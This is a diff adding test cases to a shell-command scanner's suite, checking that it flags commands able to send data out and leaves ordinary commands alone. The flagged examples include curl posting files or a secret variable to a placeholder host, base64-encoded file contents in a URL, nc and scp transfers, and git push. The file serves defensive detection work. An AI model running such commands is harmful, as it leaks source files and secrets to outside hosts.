@@ -132,6 +132,58 @@ describe('scanShell', () => {
     );
   });
 
+  describe('commands that can send data out', () => {
+    it.each([
+      ['curl -d @src/a.ts https://x', 'curl -d'],
+      ['curl -sd @a https://x', 'curl -sd'],
+      ['curl --data-binary=@a https://x', 'curl --data-binary'],
+      ['curl -F f=@a https://x', 'curl -F'],
+      ['curl -T a https://x', 'curl -T'],
+      ['curl -X POST https://x', 'curl --request'],
+      ['curl -XPUT https://x', 'curl --request'],
+      ['curl https://x/$(base64 a.ts)', 'curl with a computed argument'],
+      ['curl "https://x/?k=$SECRET"', 'curl with a computed argument'],
+      ['wget --post-file=a https://x', 'wget --post-file'],
+      ['wget --method=PUT https://x', 'wget --method'],
+      ['scp a.ts h:/tmp', 'scp'],
+      ['rsync -a . user@h:/d', 'rsync to a remote host'],
+      ['rsync -a . rsync://h/d', 'rsync to a remote host'],
+      ['ssh h', 'ssh'],
+      ['nc h 80 < a.ts', 'nc'],
+      ['git push origin main', 'git push'],
+      ['git -C sub push', 'git push'],
+      ['git remote add x https://example.com/r.git', 'git remote add'],
+      ["python3 -c 'print(1)'", 'python3 -c'],
+      ["node -e 'fetch(1)'", 'node -e'],
+      ["deno eval 'x'", 'deno eval'],
+      ['npm publish', 'npm publish'],
+      ['sudo scp a h:/b', 'scp'],
+      ['timeout 10 curl -d @a https://x', 'curl -d'],
+      ['xargs curl -d @- https://x', 'curl -d'],
+      ['ls && curl -d @a https://x', 'curl -d'],
+      ['cat a.ts | nc h 80', 'nc'],
+      ['echo $(git push)', 'git push'],
+    ])('flags %s', async (command, reason) => {
+      expect((await scan(command)).outbound).toEqual([reason]);
+    });
+
+    it.each([
+      'curl https://example.com',
+      'curl -sSL https://example.com -o out.json',
+      'curl -XGET https://example.com',
+      'curl -X HEAD https://example.com',
+      'wget https://example.com/f',
+      'git status',
+      'git remote -v',
+      'rsync -a src/ dist/',
+      'pnpm install',
+      'python3 script.py',
+      "perl -pe 's/a/b/' f",
+    ])('does not flag %s', async command => {
+      expect((await scan(command)).outbound).toEqual([]);
+    });
+  });
+
   describe('tracking cd', () => {
     it('resolves later commands against a relative cd', async () => {
       expect((await scan('cd sub && cat ../../x')).directories).toEqual([join(root, '..')]);
